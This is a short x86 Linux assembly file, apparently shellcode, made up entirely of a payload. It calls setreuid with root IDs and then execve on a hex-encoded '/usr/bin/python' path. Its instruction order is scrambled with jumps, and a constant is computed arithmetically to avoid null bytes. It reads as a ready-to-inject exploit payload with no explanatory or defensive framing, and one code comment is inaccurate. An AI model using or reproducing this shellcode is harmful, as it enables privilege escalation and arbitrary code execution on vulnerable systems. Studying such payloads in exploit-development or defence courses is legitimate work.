
global _start

section .text
_start:
	xor ebx,ebx		;zero out EBX
	mul ebx			;zero out EAX,EDX
	mov edx,ecx		;zero out ECX
	add al, 0x46		;EAX=0x46
	int 0x80
	jmp last

first:
	pop ebx
	jmp second

third:
	mov eax, esi
        mov    [ebx+0xf],al
        mov    [ebx+0x10],ebx
        jmp sixth
	
seventh:
	mov    [ebx+0x14],eax
        mov    al,0xb
        jmp fourth

fifth:
	lea    ecx,[ebx+0x10]
        lea    edx,[ebx+0x14]
        int    0x80

second:
	xor esi, esi
	jmp third

fourth:
	cld
	jmp fifth

sixth:
	add esi, 0xbd9e894e
	rol esi, 2
	jmp seventh

last:
	call   first
        cmdstr: db 0x2f,0x75,0x73,0x72,0x2f,0x62,0x69,0x6e,0x2f,0x70,0x79,0x74,0x68,0x6f,0x6e

